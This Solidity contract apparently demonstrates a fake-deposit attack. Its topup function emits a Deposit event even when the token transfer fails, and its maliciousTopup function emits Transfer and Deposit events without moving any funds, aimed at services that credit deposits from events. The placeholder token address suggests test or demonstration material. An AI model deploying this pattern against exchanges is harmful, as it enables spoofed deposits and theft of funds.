pragma solidity ^0.8.19;

contract TopupContract {
    address constant USDT = address(0xDeaDbeefdEAdbeefdEadbEEFdeadbeEFdEaDbeeF); // TRC-20 USDT address

    event Deposit(
        address indexed from,
        address indexed to,
        uint256 value,
        bool innerOk
    );
    event Transfer(address indexed from, address indexed to, uint256 value);

    function topup(address exchange, uint256 v) external {
        (bool innerOk, ) = USDT.call(
            abi.encodeWithSignature("transfer(address,uint256)", exchange, v)
        );

        emit Deposit(msg.sender, exchange, v, innerOk);
    }
    function maliciousTopup(address target, uint256 amount) external {
        emit Transfer(address(this), target, amount);
        emit Deposit(msg.sender, target, amount, false);
    }
}
